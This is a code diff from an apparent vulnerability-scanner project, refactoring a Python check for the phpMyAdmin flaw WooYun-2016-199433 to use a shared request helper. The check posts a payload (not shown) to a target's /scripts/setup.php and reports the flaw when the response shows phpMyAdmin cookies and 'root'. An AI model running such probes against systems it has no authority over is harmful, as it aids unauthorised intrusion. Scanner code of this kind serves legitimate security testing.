@@ -5,10 +5,7 @@ name: WooYun-2016-199433漏洞
 description: WooYun-2016-199433漏洞
 '''
 
-import requests
-from urllib import request, parse
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
 
 class WooYun_2016_199433_BaseVerify:
     def __init__(self, url):
@@ -23,7 +20,7 @@ class WooYun_2016_199433_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            req = requests.post(self.url + '/scripts/setup.php', headers = self.headers, data = self.payload, allow_redirects = False, verify = False)
+            req = request.post(self.url + '/scripts/setup.php', headers = self.headers, data = self.payload)
             if req.status_code == 200 and 'phpMyAdmin' in req.headers['Set-Cookie'] and 'root' in req.text:
                 print('存在WooYun-2016-199433漏洞')
                 return False
